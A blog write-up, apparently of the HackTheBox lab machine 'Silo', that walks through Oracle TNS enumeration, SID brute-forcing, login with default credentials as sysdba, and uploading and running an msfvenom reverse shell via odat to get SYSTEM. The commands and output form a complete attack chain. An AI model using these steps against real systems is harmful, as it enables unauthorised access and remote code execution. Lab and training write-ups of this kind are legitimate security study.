---
layout: post
title: "silo"
date: 2025-09-12 
categories: OSCP Playlist
---
# silo

# Summary

- nmap discover oracle tns
- metasploit module to bruteforce SID to find db
- connect with sqlplus with default credentials
- realise we can also login as sysdba
- create reverse shell
- write reverse shell with odat on backend
- execute reverse shell with odat, odat was ran with SYTEM
- include path to execute commands normally

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/silo 10.10.10.82

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-12T10:55:10
|_  start_date: 2025-09-12T10:49:25
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
```

From the open ports and the IIS server, this appears to be a Windows box. Let’s first check if null authentication is enabled on SMB:

```bash
nxc smb 10.10.10.82 -u '' -p ''

SMB         10.10.10.82     445    SILO             [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)                                                                                                                                        
SMB         10.10.10.82     445    SILO             [-] SILO\: STATUS_ACCESS_DENIED

smbclient -N -L //10.10.10.82

session setup failed: NT_STATUS_ACCESS_DENIED
```

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/silo/image.png)

It’s IIS 8.5. 

Let’s fuzz:

feroxbuster:

```bash
feroxbuster -u http://10.10.10.82 -C 404

404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      156c http://10.10.10.82/aspnet_client => http://10.10.10.82/aspnet_client/
200      GET      334l     2089w   180418c http://10.10.10.82/iis-85.png
200      GET       32l       55w      701c http://10.10.10.82/
301      GET        2l       10w      156c http://10.10.10.82/Aspnet_client => http://10.10.10.82/Aspnet_client/
301      GET        2l       10w      156c http://10.10.10.82/aspnet_Client => http://10.10.10.82/aspnet_Client/
301      GET        2l       10w      167c http://10.10.10.82/aspnet_client/system_web => http://10.10.10.82/aspnet_client/system_web/
301      GET        2l       10w      156c http://10.10.10.82/ASPNET_CLIENT => http://10.10.10.82/ASPNET_CLIENT/
301      GET        2l       10w      167c http://10.10.10.82/Aspnet_client/system_web => http://10.10.10.82/Aspnet_client/system_web/

```

ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.82/FUZZ -ic
```

Nothing. Let’s shift our focus on port 1521, hosting Oracle TNS listener 11.2.0.2.0. The Oracle Transparent Network Substrate (TNS) Listener is a server-side process that runs on the database host and acts as a network gateway for Oracle databases. It enables remote clients to establish sessions with the database without needing direct access to the underlying server. 

TNS Listener Poison Attack (CVE-2012-1675) allow attackers to register rogue database instances remotely.

The SID (Service Identifier) is a unique name for an Oracle database instance, used by clients to connect to a specific database via the TNS Listener. SID brute-forcing involves systematically guessing valid SIDs on an Oracle database server to identify accessible database instances. The TNS Listener responds differently when a valid SID is queried versus an invalid one, allowing attackers to infer valid SIDs based on response patterns. Objective: Identify valid SIDs to target for further exploitation, such as connecting to the database with weak credentials or exploiting a known vulnerability.

```bash
msfconsole
use auxiliary/admin/oracle/sid_brute
set RHOSTS 10.10.10.82
run
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'

```

The default credentials are:

```bash
scott/tiger
system/manager
sys/change_on_install
admin/admin
```

Now we need the oracle client so we can connect:

https://www.oracle.com/uk/database/technologies/instant-client/linux-x86-64-downloads.html

Instructions:

```bash
sudo mkdir /opt/oracle
sudo unzip instantclient-basic-linux.x64-23.9.0.25.07.zip 
sudo apt install libaio1t64

sudo sh -c "echo /opt/oracle/instantclient_23_9 > /etc/ld.so.conf.d/oracle-instantclient.conf" sudo ldconfig
export PATH=/opt/oracle/instantclient_23_9:$PATH

export LD_LIBRARY_PATH=/opt/oracle/instantclient_23_9:$LD_LIBRARY_PATH
echo $LD_LIBRARY_PATH

/opt/oracle/instantclient_23_9:   

export PATH=/opt/oracle/instantclient_23_9:$PATH
which sqlplus

/opt/oracle/instantclient_23_9/sqlplus

echo 'export LD_LIBRARY_PATH=/opt/oracle/instantclient_23_9:$LD_LIBRARY_PATH' >> ~/.zshrc
source ~/.zshrc
```

Let’s try to connect:

```bash
sqlplus scott/tiger@10.10.10.82:1521/XE
```

We are in.

- **List Tables**:
    
    ```sql
    SELECT table_name FROM user_tables;  -- Current user’s tables
    
    DEPT
    EMP
    BONUS
    SALGRADE
    
    SELECT * FROM DEPT;
        DEPTNO DNAME          LOC
    ---------- -------------- -------------
            10 ACCOUNTING     NEW YORK
            20 RESEARCH       DALLAS
            30 SALES          CHICAGO
            40 OPERATIONS     BOSTON
            
            
    SELECT * FROM EMP;
    
    SELECT * FROM BONUS;
    
    SELECT * FROM SALGRADE;
    
    SELECT * FROM user_role_privs;
    
    USERNAME                       GRANTED_ROLE                   ADM DEF OS_
    ------------------------------ ------------------------------ --- --- ---
    SCOTT                          CONNECT                        NO  YES NO
    SCOTT                          RESOURCE                       NO  YES NO
    
    ```
    
- **Search for Flag**:
    
    ```sql
    SELECT * FROM FLAG_TABLE;  -- Replace with suspected table name
    SELECT column_name FROM user_tab_columns WHERE column_name LIKE '%FLAG%';
    
    ```
    

Let’s see if we can connect to oracle db as the db adminsitrator:

```bash
sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba

#recheck our privileges
SELECT * FROM user_role_privs;

#we have all the priv now
```

Let’s use odat to read:

```bash
sudo apt install odat
```

```bash
odat utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module

[1] (10.10.10.82:1521): Test if the UTL_FILE library can be used
[1.1] UTL_FILE library ?
[+] OK
```

Let’s try writing a reverse shell and executing it:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f exe > rev.exe
```

Now write the file, set up listener, and execute it:

```bash
odat utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile "C:\temp" rev.exe /home/kali/htb_labs/silo/rev.exe

[1] (10.10.10.82:1521): Put the /home/kali/htb_labs/silo/rev.exe local file in the C:\temp folder like rev.exe on the 10.10.10.82 server
[+] The /home/kali/htb_labs/silo/rev.exe file was created on the C:\temp directory on the 10.10.10.82 server like the rev.exe file

```

```bash
#on attack 
nc -lnvp 4444

odat dbmsscheduler -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --exec "C:\temp\rev.exe"
```

We don’t have normal batch commands?

![image.png]({{ site.baseurl }}/assets/silo/image%201.png)

Let’s check if we are in a restricted shell:

```bash
echo %COMSPEC%

C:\Windows\system32\cmd.exe
```

We are not, maybe the path is missing; let’s try entering full path with command:

```bash
C:\Windows\System32\whoami.exe

```

![image.png]({{ site.baseurl }}/assets/silo/image%202.png)

Let’s add path:

```bash
set PATH=%PATH%;C:\Windows\System32
```

Now commands should be as normal.